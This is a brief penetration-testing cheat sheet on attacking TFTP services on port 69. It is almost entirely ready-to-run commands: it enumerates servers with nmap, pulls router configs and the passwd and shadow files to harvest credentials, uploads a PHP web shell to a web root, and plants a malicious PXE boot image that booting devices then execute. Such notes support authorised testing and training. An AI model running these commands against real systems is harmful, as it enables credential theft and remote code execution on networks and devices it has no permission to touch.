# TFTP (69)

!!! tip "Start here"
    TFTP has no authentication — fetch common config files immediately: `atftp --get --remote-file running-config --local-file running-config 10.10.10.10`. Network device configs often contain SNMP community strings, local credentials, and VPN pre-shared keys.

---

## Enumeration

```bash
nmap -sU -p 69 --script tftp-enum 10.10.10.10
```

---

## Fetching Files

```bash
atftp --get --remote-file running-config --local-file running-config 10.10.10.10
atftp --get --remote-file startup-config --local-file startup-config 10.10.10.10
```

Common files to try:

```
running-config
startup-config
config.cfg
router.conf
passwd
shadow
```

---

## Uploading Files

If the server allows writes, upload to a web-accessible path for a shell:

```bash
atftp --put --local-file shell.php --remote-file /var/www/html/shell.php 10.10.10.10
```

---

## PXE Boot Abuse

If the TFTP server is used for PXE booting, download boot files and check if they're writable:

```bash
tftp 10.10.10.10
tftp> get pxelinux.0
tftp> get boot.cfg
tftp> put malicious_pxeboot.efi
```

!!! tip "Real-world"
    TFTP mostly shows up on network gear (Cisco, Juniper) used for config backups, and on Windows Deployment Services for PXE. The config backup case is straightforward — pull and read. PXE write access is rare but devastating: any device that PXE boots will execute your image on reboot.
